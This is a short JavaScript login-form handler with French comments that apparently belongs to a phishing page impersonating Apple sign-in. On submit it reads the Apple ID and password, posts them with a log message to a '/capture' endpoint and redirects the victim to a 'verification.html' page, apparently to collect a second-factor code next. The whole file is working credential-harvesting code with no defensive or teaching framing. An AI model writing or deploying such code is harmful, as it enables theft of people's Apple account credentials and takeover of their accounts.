document.querySelector(".login-form").addEventListener("submit", function(event) {
    event.preventDefault();
    
    const appleId = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;
    const interaction = `Tentative de connexion avec identifiant : ${appleId}`;

    // Envoyer les identifiants au serveur
    fetch('/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ interaction, appleId, password })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
        // Rediriger vers la page de vérification de code
        window.location.href = "verification.html";
    })
    .catch(error => console.error('Erreur:', error));
});
